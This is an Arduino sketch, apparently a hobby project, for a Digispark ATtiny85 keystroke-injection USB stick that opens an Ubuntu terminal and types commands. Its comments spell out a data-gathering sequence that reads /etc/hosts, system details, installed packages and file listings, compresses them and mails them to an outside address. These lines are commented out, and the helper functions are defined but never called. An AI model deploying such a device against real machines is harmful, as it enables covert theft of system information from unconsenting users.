//Digispark attiny85 code for generating a usb key
// that automatically gathers ubuntu information
// 2018 Personal project, trying some arduino stuff
// published under GPL v3.0
// Galimba

#include "DigiKeyboard.h"

char* body="Your email body here";
char* address= "user@example.ru";
char* file= "filename.zip";
char* path= "/tmp/1337";
void setup()
{
  // Inicializamos el teclado
  pinMode(1,OUTPUT); // Onboard LED
  DigiKeyboard.sendKeyStroke(0); // official github says this should be here
}

void loop()
{ //Main loop
  delay(1500); //giving it a sec to load up the terminal, just in case :-)
  //lockScreen();
  //flash(500);
  //mkdir -p /tmp/1337 touch /tmp/1337/filename.txt
  //echo `cat /etc/hosts` >> /tmp/1337/filename.txt
  //echo `uname -a` >> /tmp/1337/filename.txt
  //echo `apt list --installed` >> /tmp/1337/filename.txt
  //echo `find /etc -readable | more` >> /tmp/1337/filename.txt
  //cd && echo `ls -laR` >> /tmp/1337/filename.txt
  //gzip /tmp/1337/filename.txt
  //echo "Message Body Here" | mail -s "Subject Here" user@example.com -A filename.gz
  
  delay(30000);
}

void openTerm()
{ //Ubuntu key shortcut to open a new terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT|MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);
}

void runCmd(char *txt)
{ //this will just print a command and hit enter
  DigiKeyboard.println(txt);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

/*void flash(int ms)
{ //this will flash the onboard led every ms milliseconds
  digitalWrite(1,HIGH);
  delay(ms);
  digitalWrite(1,LOW);
}*/

/*void lockScreen()
{
   DigiKeyboard.sendKeyStroke(KEY_L,MOD_ALT_LEFT|MOD_CONTROL_LEFT);
}*/
